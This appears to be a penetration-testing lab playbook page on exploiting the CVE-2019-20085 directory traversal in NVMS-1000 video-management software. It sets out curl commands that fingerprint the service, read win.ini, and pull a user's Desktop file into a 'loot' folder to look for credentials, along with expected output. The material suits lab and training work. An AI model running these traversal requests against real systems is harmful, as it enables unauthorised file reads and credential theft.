# Windows - Web - NVMS-1000

**Windows web supplement**

*Confirm the NVMS-1000 fingerprint, prove traversal safely, then read a known Windows file.*

## Run this

~~~bash
curl -s http://$BoxIP/Pages/login.htm | grep -i title
searchsploit nvms
searchsploit -x 47774
~~~

## Example output

~~~text
<title>NVMS-1000</title>
NVMS 1000 - Directory Traversal
~~~

## What did you get?

- **NVMS-1000 confirmed:** test CVE-2019-20085 traversal.
- **No NVMS-1000:** return to Step 23 · [[Windows - Web Enum]] and enumerate the web service again.

## Run this

~~~bash
curl -s --path-as-is http://$BoxIP/../../../../../../../../../../../../windows/win.ini
~~~

## Example output

~~~text
; for 16-bit app support
[fonts]
[extensions]
~~~

## What did you get?

- **win.ini returned:** read the file named in the FTP note or web enumeration.
- **404 or login page:** check that --path-as-is is present and increase the traversal depth.

## Run this

~~~bash
curl -s --path-as-is \
  http://$BoxIP/../../../../../../../../../../../../Users/$Username2/Desktop/$File \
  -o $BoxDir/loot/$File
~~~

## Example output

~~~text
HTTP/1.1 200 OK
file saved to loot
~~~

## What did you get?

- **A non-empty file is saved:** inspect it privately for usernames or passwords, then validate the result over SSH or another exposed service.
- **Empty or 404:** confirm the Windows path, filename, and account name.

## Gotcha

Curl normalises ../ by default. Without --path-as-is, the traversal can be stripped before the request reaches the application. Test windows/win.ini first because it is a predictable readable file.

## External Resources

- [HackTricks NVMS-1000](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nvms-1000)
- [Exploit-DB 47774](https://www.exploit-db.com/exploits/47774)

